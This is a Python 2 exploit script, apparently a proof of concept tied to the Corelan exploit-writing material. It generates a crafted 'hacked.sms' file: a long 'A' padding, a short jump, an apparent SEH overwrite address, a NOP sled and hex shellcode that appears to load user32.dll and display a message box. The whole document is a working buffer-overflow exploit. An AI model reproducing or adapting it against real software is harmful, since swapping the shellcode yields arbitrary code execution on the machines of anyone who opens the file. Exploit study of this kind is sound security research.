import time   
 
sc =("d9eb9bd97424f431d2b27a31c964"
"8b71308b760c8b761c8b46088b7e"
"208b36384f1875f35901d1ffe160"
"8b6c24248b453c8b54057801ea8b"
"4a188b5a2001ebe337498b348b01"
"ee31ff31c0fcac84c0740ac1cf0d"
"01c7e9f1ffffff3b7c242875de8b"
"5a2401eb668b0c4b8b5a1c01eb8b"
"048b01e88944241c61c3b20829d4"
"89e589c2688e4e0eec52e89cffff"
"ff894504bb7ed8e273871c2452e8"
"8bffffff894508686c6c20ff6833"
"322e646875736572885c240a89e6"
"56ff550489c250bba8a24dbc871c"
"2452e85effffff68703058206820"
"6368616864204279686f69746568"
"4578706c31db885c241289e3686b"
"58202068426c6163687468652068"
"75676820685468726f31c9884c24"
"1189e131d252535152ffd031c050"
"ff5508")
 
buf= "A" * 1834
buf+= "eb069090"
buf+= "F25E4300"   
buf+= "90" * 20
buf+= sc
  
try:
   crash = open("hacked.sms",'w')
   crash.write(buf)
   crash.close()
   print "[+] Visit www.corelan.be port 8800!\n"
except:
   print "Error occured, look at the code!\n"
time.sleep(2)
 
print  "[+] Exploit file created!\n"